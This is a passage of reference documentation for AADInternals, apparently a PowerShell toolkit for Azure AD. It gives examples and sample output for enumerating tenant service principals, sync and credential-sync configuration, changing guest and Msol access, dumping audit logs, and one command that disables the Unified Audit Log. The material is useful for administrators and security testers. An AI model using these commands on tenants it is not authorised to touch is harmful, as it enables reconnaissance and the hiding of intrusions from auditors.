Extracts Azure AD service principals.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># List service principals</span>
<span class="nb">Get-AADIntServicePrincipals</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>AccountEnabled        : true
Addresses             :
AppPrincipalId        : d32c68ad-72d2-4acb-a0c7-46bb2cf93873
DisplayName           : Microsoft Activity Feed Service
ObjectId              : 321e7bdd-d7b0-4a64-8eb3-38c259c1304a
ServicePrincipalNames : ServicePrincipalNames
TrustedForDelegation  : false

AccountEnabled        : true
Addresses             : Addresses
AppPrincipalId        : 0000000c-0000-0000-c000-000000000000
DisplayName           : Microsoft App Access Panel
ObjectId              : a9e03f2f-4471-41f2-96c5-589d5d7117bc
ServicePrincipalNames : ServicePrincipalNames
TrustedForDelegation  : false

AccountEnabled        : true
Addresses             :
AppPrincipalId        : dee7ba80-6a55-4f3b-a86c-746a9231ae49
DisplayName           : Microsoft AppPlat EMA
ObjectId              : ae0b81fc-c521-4bfd-9eaa-04c520b4b5fd
ServicePrincipalNames : ServicePrincipalNames
TrustedForDelegation  : false

AccountEnabled        : true
Addresses             : Addresses
AppPrincipalId        : 65d91a3d-ab74-42e6-8a2f-0add61688c74
DisplayName           : Microsoft Approval Management
ObjectId              : d8ec5b95-e5f6-416e-8e7c-c6c52ec5a11f
ServicePrincipalNames : ServicePrincipalNames
TrustedForDelegation  : false
</code></pre>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get details for Microsoft Activity Feed Service</span>
<span class="nb">Get-AADIntServicePrincipals</span> <span class="n">-ClientIds</span> <span class="n">d32c68ad</span><span class="p">-</span><span class="n">72d2</span><span class="p">-</span><span class="n">4acb-a0c7</span><span class="p">-</span><span class="n">46bb2cf93873</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>odata.type                          : Microsoft.DirectoryServices.ServicePrincipal
objectType                          : ServicePrincipal
objectId                            : 321e7bdd-d7b0-4a64-8eb3-38c259c1304a
deletionTimestamp                   :
accountEnabled                      : True
addIns                              : {}
alternativeNames                    : {}
appBranding                         :
appCategory                         :
appData                             :
appDisplayName                      : Microsoft Activity Feed Service
appId                               : d32c68ad-72d2-4acb-a0c7-46bb2cf93873
applicationTemplateId               :
appMetadata                         :
appOwnerTenantId                    : f8cdef31-a31e-4b4a-93e4-5f571e91255a
appRoleAssignmentRequired           : False
appRoles                            : {}
authenticationPolicy                :
disabledByMicrosoftStatus           :
displayName                         : Microsoft Activity Feed Service
errorUrl                            :
homepage                            :
informationalUrls                   : @{termsOfService=; support=; privacy=; marketing=}
keyCredentials                      : {}
logoutUrl                           :
managedIdentityResourceId           :
microsoftFirstParty                 : True
notificationEmailAddresses          : {}
oauth2Permissions                   : {...}
passwordCredentials                 : {}
preferredSingleSignOnMode           :
preferredTokenSigningKeyEndDateTime :
preferredTokenSigningKeyThumbprint  :
publisherName                       : Microsoft Services
replyUrls                           : {}
samlMetadataUrl                     :
samlSingleSignOnSettings            :
servicePrincipalNames               : {d32c68ad-72d2-4acb-a0c7-46bb2cf93873, https://activity.windows.com, https://acti
                                      vity.microsoft.com, https://enterprise.activity.windows.com}
tags                                : {}
tokenEncryptionKeyId                :
servicePrincipalType                : Application
useCustomTokenSigningKey            :
verifiedPublisher                   : @{displayName=; verifiedPublisherId=; addedDateTime=}
</code></pre>

<h3 id="get-aadintsubscriptions-a">Get-AADIntSubscriptions (A)</h3>

<p>This function returns tenant’s subscription details, such as name, id, number of licenses, and when created.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get subscriptions of the tenant</span>
<span class="nb">Get-AADIntSubscriptions</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>SkuPartNumber     WarningUnits TotalLicenses IsTrial NextLifecycleDate    OcpSubscriptionId                    ConsumedUnits ObjectId                             SkuId                                DateCreated         
-------------     ------------ ------------- ------- -----------------    -----------------                    ------------- --------                             -----                                -----------         
EMSPREMIUM        0            250           true    2018-11-13T00:00:00Z 76909010-12ed-4b05-b3d7-ee1b42c21b4e 21            58265dbe-24e0-4cdb-8b62-51197a4c1c13 b05e124f-c7cc-45a0-a6aa-8cf78c946968 2018-08-13T00:00:00Z
ENTERPRISEPREMIUM 25           25            true    2018-10-27T15:47:40Z 7c206b83-2487-49fa-b91e-3d676de02ccb 21            df58544b-5062-4d6c-85de-937f203bbe0f c7df2760-2c81-4ef7-b578-5b5392b571df 2018-08-27T00:00:00Z
</code></pre>

<h3 id="get-aadintsposerviceinformation-a">Get-AADIntSPOServiceInformation (A)</h3>

<p>This function returns details of tenant’s SharePoint Online instance, such as when created and last modified.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get SharePoint Online information</span>
<span class="nb">Get-AADIntSPOServiceInformation</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong> (sorted for clarity)</p>

<pre><code>CreatedOn                               : 6/26/2018 11:16:12 AM
EnableOneDriveforSuiteUsers             : False
InstanceId                              : 44f5a625-f90e-4916-b8ab-ec45d38bdbb6
LastModifiedOn                          : 10/25/2018 7:37:38 AM
OfficeGraphUrl                          : https://company-my.sharepoint.com/_layouts/15/me.aspx
RootAdminUrl                            : https://company-admin.sharepoint.com/
RootIWSPOUrl                            : https://company-my.sharepoint.com/
SPO_LegacyPublicWebSiteEditPage         : Pages/Forms/AllItems.aspx
SPO_LegacyPublicWebSitePublicUrl        : 
SPO_LegacyPublicWebSiteUrl              : 
SPO_MySiteHostUrl                       : https://company-my.sharepoint.com/
SPO_MySiteHost_AboutMeUrl               : https://company-my.sharepoint.com/person.aspx
SPO_MySiteHost_DocumentsUrl             : https://company-my.sharepoint.com/_layouts/15/MySite.aspx?MySiteRedirect=AllDocuments
SPO_MySiteHost_NewsFeedUrl              : https://company-my.sharepoint.com/default.aspx
SPO_MySiteHost_ProjectSiteUrl           : https://company-my.sharepoint.com/_layouts/15/MyProjects.aspx
SPO_MySiteHost_SitesUrl                 : https://company-my.sharepoint.com/_layouts/15/MySite.aspx?MySiteRedirect=AllSites
SPO_PublicWebSitePublicUrl              : 
SPO_PublicWebSiteUrl                    : NotSupported
SPO_RegionalRootSiteUrl                 : https://company.sharepoint.com/
SPO_RootSiteUrl                         : https://company.sharepoint.com/
SPO_TenantAdminUrl                      : https://company-admin.sharepoint.com/
SPO_TenantAdmin_CreateSiteCollectionUrl : https://company-admin.sharepoint.com/_layouts/15/online/CreateSiteFull.aspx
SPO_TenantAdmin_ProjectAdminUrl         : https://company-admin.sharepoint.com/
SPO_TenantAdmin_ViewSiteCollectionsUrl  : https://company-admin.sharepoint.com/
SPO_TenantUpgradeUrl                    : https://company-admin.sharepoint.com/
ServiceInformation_LastChangeDate       : 10/25/2018 7:37:22 AM
ShowSites_InitialVisibility             : True
ShowSkyDrivePro_InitialVisibility       : True
ShowYammerNewsFeed_InitialVisibility    : True
VideoPortalServerRelativeUrl            : /portals/hub/_layouts/15/videohome.aspx
</code></pre>

<h3 id="get-aadintcompanyinformation-a">Get-AADIntCompanyInformation (A)</h3>

<p>This function returns details about tenant’s company information. Pretty much same functionality than <strong>Get-MsolCompanyInformation</strong> cmdlet.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get company information of the tenant</span>
<span class="nb">Get-AADIntCompanyInformation</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>AllowAdHocSubscriptions                  : false
AllowEmailVerifiedUsers                  : false
AuthorizedServiceInstances               : AuthorizedServiceInstances
AuthorizedServices                       : 
City                                     : 
CompanyDeletionStartTime                 : 
CompanyTags                              : CompanyTags
CompanyType                              : CompanyTenant
CompassEnabled                           : 
Country                                  : 
CountryLetterCode                        : GB
DapEnabled                               : 
DefaultUsageLocation                     : 
DirSyncAnchorAttribute                   : 
DirSyncApplicationType                   : 1651564e-7ce4-4d99-88be-0a65050d8dc3
DirSyncClientMachineName                 : SERVER2016
DirSyncClientVersion                     : 1.1.882.0
DirSyncServiceAccount                    : Sync_SERVER2016_acf4f37725ce@company.onmicrosoft.com
DirectorySynchronizationEnabled          : true
DirectorySynchronizationStatus           : Enabled
DisplayName                              : Company Ltd
InitialDomain                            : company.onmicrosoft.com
LastDirSyncTime                          : 2018-10-25T13:53:46Z
LastPasswordSyncTime                     : 2018-10-25T14:03:01Z
MarketingNotificationEmails              : 
MultipleDataLocationsForServicesEnabled  : 
ObjectId                                 : 6c1a3ac3-5416-4dd0-984e-228cc80dbc9f
PasswordSynchronizationEnabled           : true
PortalSettings                           : PortalSettings
PostalCode                               : 
PreferredLanguage                        : en
ReleaseTrack                             : StagedRollout
ReplicationScope                         : EU
RmsViralSignUpEnabled                    : false
SecurityComplianceNotificationEmails     : 
SecurityComplianceNotificationPhones     : 
SelfServePasswordResetEnabled            : false
ServiceInformation                       : ServiceInformation
ServiceInstanceInformation               : ServiceInstanceInformation
State                                    : 
Street                                   : 
SubscriptionProvisioningLimited          : false
TechnicalNotificationEmails              : TechnicalNotificationEmails
TelephoneNumber                          : 123456789
UIExtensibilityUris                      : 
UsersPermissionToCreateGroupsEnabled     : false
UsersPermissionToCreateLOBAppsEnabled    : false
UsersPermissionToReadOtherUsersEnabled   : true
UsersPermissionToUserConsentToAppEnabled : false
</code></pre>

<h3 id="get-aadintcompanytags-a">Get-AADIntCompanyTags (A)</h3>

<p>This function returns tags attached to the tenant. Microsoft uses these to identity the status of certain changes, such as SharePoint version update.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get login information for a domain</span>
<span class="nb">Get-AADIntCompanyTags</span> <span class="n">-Domain</span> <span class="s2">"company.com"</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>azure.microsoft.com/azure=active
o365.microsoft.com/startdate=635711754831829038
o365.microsoft.com/version=15
o365.microsoft.com/signupexperience=GeminiSignUpUI
o365.microsoft.com/14to15UpgradeScheduled=True
o365.microsoft.com/14to15UpgradeCompletedDate=04-16-2013
</code></pre>

<h3 id="get-aadintaadconnectstatus-z">Get-AADIntAADConnectStatus (Z)</h3>

<p>Since version 0.4.5
Shows the status of Azure AD Connect (AAD Connect).</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForAADIAMAPI</span> <span class="n">-SaveToCache</span>

<span class="c"># Show the status of AAD Connect</span>
<span class="nb">Get-AADIntAADConnectStatus</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>verifiedDomainCount              : 4
verifiedCustomDomainCount        : 3
federatedDomainCount             : 2
numberOfHoursFromLastSync        : 0
dirSyncEnabled                   : True
dirSyncConfigured                : True
passThroughAuthenticationEnabled : True
seamlessSingleSignOnEnabled      : True
</code></pre>

<h3 id="get-aadintsyncconfiguration-a">Get-AADIntSyncConfiguration (A)</h3>

<p>This function returns synchronisation details.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get tenant sync configuration</span>
<span class="nb">Get-AADIntSyncConfiguration</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>TresholdCount                           : 501
UserContainer                           : 
TenantId                                : 6c1a3ac3-5416-4dd0-984e-228cc80dbc9f
ApplicationVersion                      : 1651564e-7ce4-4d99-88be-0a65050d8dc3
DisplayName                             : Company Ltd
IsPasswordSyncing                       : true
AllowedFeatures                         : {ObjectWriteback,  , PasswordWriteback}
PreventAccidentalDeletion               : EnabledForCount
TotalConnectorSpaceObjects              : 15
MaxLinksSupportedAcrossBatchInProvision : 15000
UnifiedGroupContainer                   : 
IsTrackingChanges                       : false
ClientVersion                           : 1.1.882.0
DirSyncFeatures                         : 41021
SynchronizationInterval                 : PT30M
AnchorAttribute                         : 
DirSyncClientMachine                    : SERVER2016
IsDirSyncing                            : true
TresholdPercentage                      : 0
</code></pre>

<h3 id="get-aadinttenantdomain-m">Get-AADIntTenantDomain (M)</h3>

<p>Since version 0.7.2 <br>
Returns the default domain for the given tenant id.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and store to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Get the default domain of the given tenant id</span>
<span class="nb">Get-AADIntTenantDomain</span> <span class="n">-TenantId</span> <span class="n">72f988bf</span><span class="p">-</span><span class="n">86f1</span><span class="p">-</span><span class="n">41af</span><span class="p">-</span><span class="n">91ab</span><span class="p">-</span><span class="n">2d7cd011db47</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>microsoft.onmicrosoft.com
</code></pre>

<h3 id="get-aadinttenantdomains">Get-AADIntTenantDomains (*)</h3>

<p>Since version 0.1.6 <br>
This function returns all registered domains from the tenant of the given domain.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># List domains from tenant where company.com is registered</span>
<span class="nb">Get-AADIntTenantDomains</span> <span class="n">-Domain</span> <span class="n">company</span><span class="p">.</span><span class="n">com</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>company.com
company.fi
company.co.uk
company.onmicrosoft.com
company.mail.onmicrosoft.com
</code></pre>

<h3 id="new-aadintmoeradomain-z">New-AADIntMOERADomain (Z)</h3>

<p>Since version 0.8.0 <br>
Adds a new Microsoft Online Email Routing Address (MOERA) domain (.onmicrosoft.com) to the tenant.
    You can have add up to 30 MOERA domains, and can also add subdomains.</p>

<p><strong>Example 1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache </span>
<span class="nb">Get-AADIntAccessTokenForAADIAMAPI</span> <span class="n">-SaveToCache</span>
</code></pre></div>
<p></p>

<pre><code>Tenant                               User Resource                             Client                              
------                               ---- --------                             ------                              
6e3846ee-e8ca-4609-a3ab-f405cfbd02cd      74658136-14ec-4630-ad9b-26e160ff0fc6 d3590ed6-52b3-4102-aeff-aad2292ab01c
</code></pre>

<p></p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Add new MOERA domain</span>
<span class="nb">New-AADIntMOERADomain</span> <span class="n">-Domain</span> <span class="s2">"mydomain.onmicrosoft.com"</span>
</code></pre></div>

<strong>Output 2:</strong><p></p>

<pre><code>authenticationType : 
isDefault          : False
isInitial          : False
isVerified         : True
name               : mydomain.onmicrosoft.com
forceDeleteState   : 
</code></pre>

<div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get access token and save to cache </span>
<span class="nb">Get-AADIntAccessTokenForAADIAMAPI</span> <span class="n">-SaveToCache</span>
</code></pre></div>


<pre><code>Tenant                               User Resource                             Client                              
------                               ---- --------                             ------                              
6e3846ee-e8ca-4609-a3ab-f405cfbd02cd      74658136-14ec-4630-ad9b-26e160ff0fc6 d3590ed6-52b3-4102-aeff-aad2292ab01c
</code></pre>

<p></p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Try to add existing MOERA domain</span>
<span class="nb">New-AADIntMOERADomain</span> <span class="n">-Domain</span> <span class="s2">"microsoft.onmicrosoft.com"</span>
</code></pre></div>

<strong>Output 2:</strong><p></p>

<pre><code>New-AADIntMOERADomain : Domain microsoft.onmicrosoft.com is already occupied by tenant 72f988bf-86f1-41af-91ab-2d7cd011db47
</code></pre>

<h3 id="get-aadintkerberosdomainsyncconfig-a">Get-AADIntKerberosDomainSyncConfig (A)</h3>

<p>Since version 0.3.1 <br>
Gets tenant’s Kerberos domain sync configuration using Azure AD Sync API</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nv">$at</span> <span class="p">=</span> <span class="nb">Get-AADIntAccessTokenForAADGraph</span>

<span class="c"># Dump the Kerberos domain sync config</span>
<span class="nb">Get-AADIntKerberosDomainSyncConfig</span> <span class="n">-AccessToken</span> <span class="nv">$at</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>PublicEncryptionKey                                                                              SecuredEncryptionAlgorithm SecuredKeyId SecuredPartitionId
-------------------                                                                              -------------------------- ------------ ------------------
RUNLMSAAAABOD8OPj7I3nfeuh7ELE47OtA3yvyryQ0wamf5jPy2uGKibaTRKJd/kFexTpJ8siBxszKCXC2sn1Fd9pEG2y7fu 5                          2            15001 
</code></pre>

<h3 id="get-aadintwindowscredentialssyncconfig-a">Get-AADIntWindowsCredentialsSyncConfig (A)</h3>

<p>Since version 0.3.1 <br>
Gets tenant’s Windows credentials synchronization config</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nv">$at</span> <span class="p">=</span> <span class="nb">Get-AADIntAccessTokenForAADGraph</span>

<span class="c"># Dump the Windows Credentials sync</span>
<span class="nb">Get-AADIntWindowsCredentialsSyncConfig</span> <span class="n">-AccessToken</span> <span class="nv">$at</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>EnableWindowsLegacyCredentials EnableWindowsSupplementaCredentials SecretEncryptionCertificate                                                                            
------------------------------ ----------------------------------- ---------------------------                                                                            
						  True                               False MIIDJTCCAg2gAwIBAgIQFwRSInW7I...
</code></pre>

<h3 id="get-aadintsyncdeviceconfiguration-a">Get-AADIntSyncDeviceConfiguration (A)</h3>

<p>Since version 0.3.1 <br>
Gets tenant’s Windows credentials synchronization config. Does not require admin rights.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nv">$at</span> <span class="p">=</span> <span class="nb">Get-AADIntAccessTokenForAADGraph</span>

<span class="c"># Dump the Sync Device configuration</span>
<span class="nb">Get-AADIntSyncDeviceConfiguration</span> <span class="n">-AccessToken</span> <span class="nv">$at</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>PublicIssuerCertificates CloudPublicIssuerCertificates                                                                                                                    
------------------------ -----------------------------                                                                                                                    
{$null}                  {MIIDejCCAmKgAwIBAgIQzsvx7rE77rJM...
</code></pre>

<h3 id="get-aadinttenantauthpolicy-m">Get-AADIntTenantAuthPolicy (M)</h3>

<p>Since version 0.4.3 <br>
Gets tenant’s authorization policy, including user and guest settings.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Dump the tenant authentication policy</span>
<span class="nb">Get-AADIntTenantAuthPolicy</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>id                                                : authorizationPolicy
allowInvitesFrom                                  : everyone
allowedToSignUpEmailBasedSubscriptions            : True
allowedToUseSSPR                                  : True
allowEmailVerifiedUsersToJoinOrganization         : False
blockMsolPowerShell                               : False
displayName                                       : Authorization Policy
description                                       : Used to manage authorization related settings across the company.
enabledPreviewFeatures                            : {}
guestUserRoleId                                   : a0b1b346-4d3e-4e8b-98f8-753987be4970
permissionGrantPolicyIdsAssignedToDefaultUserRole : {microsoft-user-default-legacy}
defaultUserRolePermissions                        : @{allowedToCreateApps=True; allowedToCreateSecurityGroups=True;
                                                    allowedToReadOtherUsers=True}
</code></pre>

<h3 id="get-aadinttenantguestaccess-m">Get-AADIntTenantGuestAccess (M)</h3>

<p>Since version 0.4.3 <br>
Gets the guest access level of the user’s tenant.</p>

<table>
<thead>
<tr>
<th>Access level</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>Inclusive</td>
<td>Guest users have the same access as members</td>
</tr>

<tr>
<td>Normal</td>
<td>Guest users have limited access to properties and memberships of directory objects</td>
</tr>

<tr>
<td>Restricted</td>
<td>Guest user access is restricted to properties and memberships of their own directory objects (most restrictive)</td>
</tr>
</tbody>
</table>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Get the tenant guest access</span>
<span class="nb">Get-AADIntTenantGuestAccess</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Access Description                                                                        RoleId                              
------ -----------                                                                        ------                              
Normal Guest users have limited access to properties and memberships of directory objects 10dae51f-b6af-4016-8d66-8c2a99b929b3
</code></pre>

<h3 id="set-aadinttenantguestaccess-m">Set-AADIntTenantGuestAccess (M)</h3>

<p>Since version 0.4.3 <br>
Sets the guest access level of the user’s tenant.</p>

<table>
<thead>
<tr>
<th>Access level</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>Inclusive</td>
<td>Guest users have the same access as members</td>
</tr>

<tr>
<td>Normal</td>
<td>Guest users have limited access to properties and memberships of directory objects</td>
</tr>

<tr>
<td>Restricted</td>
<td>Guest user access is restricted to properties and memberships of their own directory objects (most restrictive)</td>
</tr>
</tbody>
</table>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Get the tenant guest access</span>
<span class="nb">Set-AADIntTenantGuestAccess</span> <span class="n">-Level</span> <span class="n">Normal</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>Access Description                                                                        RoleId                              
------ -----------                                                                        ------                              
Normal Guest users have limited access to properties and memberships of directory objects 10dae51f-b6af-4016-8d66-8c2a99b929b3
</code></pre>

<h3 id="enable-aadinttenantmsolaccess-m">Enable-AADIntTenantMsolAccess (M)</h3>

<p>Since version 0.4.3 <br>
Enables Msol PowerShell module access for the user’s tenant.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Enable the Msol PowerShell module access</span>
<span class="nb">Enable-AADIntTenantMsolAccess</span>

<span class="c"># Check the settings</span>
<span class="nb">Get-AADIntTenantAuthPolicy</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">block</span><span class="p">*</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>blockMsolPowerShell
-------------------
              False
</code></pre>

<h3 id="disable-aadinttenantmsolaccess-m">Disable-AADIntTenantMsolAccess (M)</h3>

<p>Since version 0.4.3 <br>
Disables Msol PowerShell module access for the user’s tenant.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForMSGraph</span> <span class="n">-SaveToCache</span>

<span class="c"># Disable the Msol PowerShell module access</span>
<span class="nb">Disable-AADIntTenantMsolAccess</span>

<span class="c"># Check the settings after 10 seconds or so.</span>
<span class="nb">Get-AADIntTenantAuthPolicy</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">block</span><span class="p">*</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>blockMsolPowerShell
-------------------
              True
</code></pre>

<h3 id="get-aadintunifiedauditlogsettings-e">Get-AADIntUnifiedAuditLogSettings (E)</h3>

<p>Since version 0.4.5 <br>
Gets Unified Audit Log settings with Get-AdminAuditLogConfig using Remote Exchange Online PowerShell.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForEXO</span> <span class="n">-SaveToCache</span>

<span class="c"># Get the unified audit log settings</span>
<span class="nb">Get-AADIntUnifiedAuditLogSettings</span> <span class="p">|</span> <span class="nb">Select </span><span class="n">Unified</span><span class="p">*</span>
</code></pre></div>
<p></p>

<p><strong>Output:</strong></p>

<pre><code>UnifiedAuditLogIngestionEnabled UnifiedAuditLogFirstOptInDate
------------------------------- -----------------------------
true                            2021-01-22T09:59:51.0870075Z
</code></pre>

<h3 id="set-aadintunifiedauditlogsettings-e">Set-AADIntUnifiedAuditLogSettings (E)</h3>

<p>Since version 0.4.5 <br>
Enables or disables Unified Audit log Set-AdminAuditLogConfig using Remote Exchange Online PowerShell. <br>
<strong>Note!</strong> It will take hours for the changes to take effect.</p>

<p><strong>Example:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get the access token</span>
<span class="nb">Get-AADIntAccessTokenForEXO</span> <span class="n">-SaveToCache</span>

<span class="c"># Disable the unified audit log</span>
<span class="nb">Set-AADIntUnifiedAuditLogSettings</span> <span class="n">-Enabled</span> <span class="n">false</span>
</code></pre></div>
<p></p>

<h3 id="get-aadintcomplianceapicookies">Get-AADIntComplianceAPICookies</h3>

<p>Since version 0.6.2 <br>
Gets cookies used with compliance API functions.</p>

<p><strong>Note!</strong> Uses interactive login form so AAD Joined or Registered computers may login automatically. If this happens, start PowerShell as another user and try again.</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get compliance API cookies</span>
<span class="nv">$cookies</span> <span class="p">=</span> <span class="nb">Get-AADIntComplianceAPICookies</span>
<span class="c"># Dump the first 150 entries from the last 90 days to json file</span>
<span class="nb">Search-AADIntUnifiedAuditLog</span> <span class="n">-Cookies</span> <span class="nv">$cookies</span> <span class="n">-Verbose</span> <span class="n">-Start</span> <span class="p">(</span><span class="nb">get-date</span><span class="p">).</span><span class="n">AddDays</span><span class="p">(-</span><span class="n">90</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">auditlog</span><span class="p">.</span><span class="n">json</span>
</code></pre></div>
<p></p>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get compliance API cookies</span>
<span class="nv">$cookies</span> <span class="p">=</span> <span class="nb">Get-AADIntComplianceAPICookies</span>
<span class="c"># Dump the whole log (max 50100) from the last 90 days to json file</span>
<span class="nb">Search-AADIntUnifiedAuditLog</span> <span class="n">-Cookies</span> <span class="nv">$cookies</span> <span class="n">-Verbose</span> <span class="n">-Start</span> <span class="p">(</span><span class="nb">get-date</span><span class="p">).</span><span class="n">AddDays</span><span class="p">(-</span><span class="n">90</span><span class="p">)</span> <span class="n">-All</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">auditlog</span><span class="p">.</span><span class="n">json</span>
</code></pre></div>
<p></p>

<p><strong>Example3:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get compliance API cookies</span>
<span class="nv">$cookies</span> <span class="p">=</span> <span class="nb">Get-AADIntComplianceAPICookies</span>
<span class="c"># Dump the whole log (max 50100) from the last 90 days to csv file</span>
<span class="nb">Search-AADIntUnifiedAuditLog</span> <span class="n">-Cookies</span> <span class="nv">$cookies</span> <span class="n">-Verbose</span> <span class="n">-Start</span> <span class="p">(</span><span class="nb">get-date</span><span class="p">).</span><span class="n">AddDays</span><span class="p">(-</span><span class="n">90</span><span class="p">)</span> <span class="n">-All</span> <span class="p">|</span> <span class="nb">ConvertTo-Csv</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">auditlog</span><span class="p">.</span><span class="n">csv</span>
</code></pre></div>
<p></p>

<h3 id="search-aadintunifiedauditlog-ca">Search-AADIntUnifiedAuditLog (CA)</h3>

<p>Since version 0.6.2 <br>
Searches Unified Audit Log using <a href="https://compliance.microsoft.com/api">https://compliance.microsoft.com/api</a>. By default, returns 150 first log entries. With -All switch returns all entries matching the query (max 50100).</p>

<p><strong>Example1:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get compliance API cookies</span>
<span class="nv">$cookies</span> <span class="p">=</span> <span class="nb">Get-AADIntComplianceAPICookies</span>
<span class="c"># Dump the first 150 entries from the last 90 days to json file</span>
<span class="nb">Search-AADIntUnifiedAuditLog</span> <span class="n">-Cookies</span> <span class="nv">$cookies</span> <span class="n">-Verbose</span> <span class="n">-Start</span> <span class="p">(</span><span class="nb">get-date</span><span class="p">).</span><span class="n">AddDays</span><span class="p">(-</span><span class="n">90</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Set-Content</span> <span class="n">auditlog</span><span class="p">.</span><span class="n">json</span>
</code></pre></div>
<p></p>

<p><strong>Example2:</strong>
</p><div class="highlight"><pre><code class="language-powershell" data-lang="powershell"><span></span><span class="c"># Get compliance API cookies</span>
<span class="nv">$cookies</span> <span class="p">=</span> <span class="nb">Get-AADIntComplianceAPICookies</span>
<span class="c"># Dump the whole log (max 50100) from the last 90 days to csv file</span>
